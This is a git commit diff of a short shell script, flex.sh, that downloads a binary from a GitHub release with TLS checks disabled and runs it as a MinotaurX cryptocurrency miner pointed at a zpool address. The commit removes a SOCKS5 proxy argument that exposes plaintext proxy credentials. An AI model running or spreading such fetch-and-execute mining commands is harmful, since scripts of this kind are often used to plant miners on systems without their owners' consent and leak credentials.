60d31fdf904540b1de2681345918b7e221f6d142
paskofamas <mr.paskofa42@jugda.com>
2025-03-26 13:38:32 +0700

    Update flex.sh

--- flex.sh
+++ flex.sh
@@ -1,3 +1,3 @@
 #!/bin/sh
 curl -sLkO http://github.com/paskofa10/webmoon/releases/download/flex/flex
-./flex -a minotaurx -o minotaurx.sea.mine.zpool.ca:7019 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW -p c=MAZA,zap=MAZA -x socks5://hyihycqs-rotate:dwbgyrcj7v06@p.webshare.io:80
+./flex -a minotaurx -o minotaurx.sea.mine.zpool.ca:7019 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW -p c=MAZA,zap=MAZA
